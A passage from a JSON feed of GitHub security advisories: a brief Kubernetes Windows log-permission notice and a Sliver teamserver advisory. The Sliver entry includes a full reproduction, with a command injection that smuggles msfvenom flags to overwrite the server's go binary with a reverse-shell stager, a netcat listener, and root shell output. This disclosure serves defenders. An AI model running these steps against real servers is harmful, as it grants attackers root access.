            "content_html": "<p>A security issue was discovered in Kubernetes clusters with Windows nodes where BUILTIN\\Users&nbsp;may be able to read container logs and NT AUTHORITY\\Authenticated Users&nbsp;may be able to modify container logs.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-5321\">https://nvd.nist.gov/vuln/detail/CVE-2024-5321</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/126161\">https://github.com/kubernetes/kubernetes/issues/126161</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0\">https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa\">https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a\">https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190\">https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1\">https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-82m2-cv7p-4m75\">https://github.com/advisories/GHSA-82m2-cv7p-4m75</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-82m2-cv7p-4m75",
            "title": "[k8s.io/kubernetes] Kubernetes sets incorrect permissions on Windows containers logs",
            "date_modified": "2024-07-18T21:58:16.000Z",
            "date_published": "2024-07-18T21:30:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-82m2-cv7p-4m75"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"description\">Description</h2>\n<p>Sliver version 1.6.0 (prerelease) is vulnerable to RCE on the teamserver by a low-privileged \"operator\" user. The RCE is as the system root user.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>As described in a <a href=\"https://github.com/BishopFox/sliver/issues/65\">past issue</a>, \"there is a clear security boundary between the operator and server, an operator should not inherently be able to run commands or code on the server.\" An operator who exploited this vulnerability would be able to view all console logs, kick all other operators, view and modify files stored on the server, and ultimately delete the server.</p>\n<h2 id=\"reproduction\">Reproduction</h2>\n<p>First configure the Sliver server <a href=\"https://sliver.sh/docs?name=Multi-player+Mode\">in multiplayer mode and add an operator profile</a>.</p>\n<p>Next, compile a slightly older version of the Sliver client. The commit after 5016fb8d updates the Cobra command-line parsing library in the Sliver client to strictly validate command flags.</p>\n<pre><code>git checkout 5016fb8d\nVERSION=1.6.0 make client\n</code></pre>\n<p>The latest server version is targeted:</p>\n<pre><code>All hackers gain exalted\n[*] Server v1.6.0 - bdfd89167dd47aece2397c638d482f94f3f91cba\n[*] Client 1.6.0 - 5016fb8d7cdff38c79e22e8293e58300f8d3bd57\n[*] Welcome to the sliver shell, please type 'help' for options`\n</code></pre>\n<p>The exploit uses a command injection in the <code>generate msf-stager</code> to inject the <code>--out</code> flag to <code>msfvenom</code>. We overwrite Sliver's own go binary at <code>/root/.sliver/go/bin/go</code>:</p>\n<pre><code>sliver &gt; generate msf-stager --lhost 192.168.0.128 --lport 8888 --advanced --platform=linux&amp;--payload=linux/x64/shell_reverse_tcp&amp;--format=elf&amp;--out=/root/.sliver/go/bin/go\n\n[*] Sliver implant stager saved to: [...]\n</code></pre>\n<p>The other injected flags are to force a Linux payload, and not necessary if running the Sliver server on Windows.</p>\n<p>If you check the saved implant locally on the client, it's 0 bytes as the output got written to the file on the server instead.</p>\n<p>On the attacking machine, setup a netcat shell:</p>\n<pre><code>$ nc -lvp 8888\nListening on 0.0.0.0 8888\n</code></pre>\n<p>Trigger the stager by running a command which executes <code>/root/.sliver/go/bin/go</code>:</p>\n<pre><code>sliver &gt; generate beacon --mtls 1.2.3.4\n[*] Generating new windows/amd64 beacon implant binary (1m0s)\n[*] Symbol obfuscation is enabled\n ⠼  Compiling, please wait ...\n</code></pre>\n<p>A root shell will pop:</p>\n<pre><code>$ nc -lvp 8888\nListening on 0.0.0.0 8888\nConnection received on 192.168.0.183 39238\nwhoami\nroot\n</code></pre>\n<p>The vulnerable code was introduced in <a href=\"https://github.com/BishopFox/sliver/pull/1281\">https://github.com/BishopFox/sliver/pull/1281</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/BishopFox/sliver/security/advisories/GHSA-hc5w-gxxr-w8x8\">https://github.com/BishopFox/sliver/security/advisories/GHSA-hc5w-gxxr-w8x8</a></li>\n<li><a href=\"https://github.com/BishopFox/sliver/pull/1281\">https://github.com/BishopFox/sliver/pull/1281</a></li>\n<li><a href=\"https://github.com/BishopFox/sliver/commit/0deaee625d14c6f05f63c86e5c3b7ae623a1138f\">https://github.com/BishopFox/sliver/commit/0deaee625d14c6f05f63c86e5c3b7ae623a1138f</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41111\">https://nvd.nist.gov/vuln/detail/CVE-2024-41111</a></li>\n<li><a href=\"https://github.com/BishopFox/sliver/issues/65\">https://github.com/BishopFox/sliver/issues/65</a></li>\n<li><a href=\"https://github.com/BishopFox/sliver/commit/5016fb8d7cdff38c79e22e8293e58300f8d3bd57\">https://github.com/BishopFox/sliver/commit/5016fb8d7cdff38c79e22e8293e58300f8d3bd57</a></li>\n<li><a href=\"https://sliver.sh/docs?name=Multi-player+Mode\">https://sliver.sh/docs?name=Multi-player+Mode</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hc5w-gxxr-w8x8\">https://github.com/advisories/GHSA-hc5w-gxxr-w8x8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hc5w-gxxr-w8x8",
            "title": "[github.com/bishopfox/sliver] Sliver Allows Authenticated Operator-to-Server Remote Code Execution",
            "date_modified": "2024-07-19T14:04:52.000Z",
            "date_published": "2024-07-18T20:23:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hc5w-gxxr-w8x8"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}